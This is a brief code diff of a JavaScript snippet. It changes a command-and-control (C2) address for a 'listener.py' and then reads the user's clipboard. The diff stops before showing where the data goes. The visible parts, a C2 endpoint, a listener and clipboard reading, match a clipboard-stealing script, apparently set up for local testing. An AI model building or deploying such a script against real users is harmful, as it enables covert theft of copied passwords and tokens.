@@ -1,6 +1,6 @@
 (async () => {
   const sleep = ms => new Promise(r => setTimeout(r, ms));
-  const C2 = "http://10.0.0.73:8081"; // local IP to reach listener.py
+  const C2 = "http://10.0.0.1:8081"; // local IP to reach listener.py
 
   try {
     const text = await navigator.clipboard.readText();
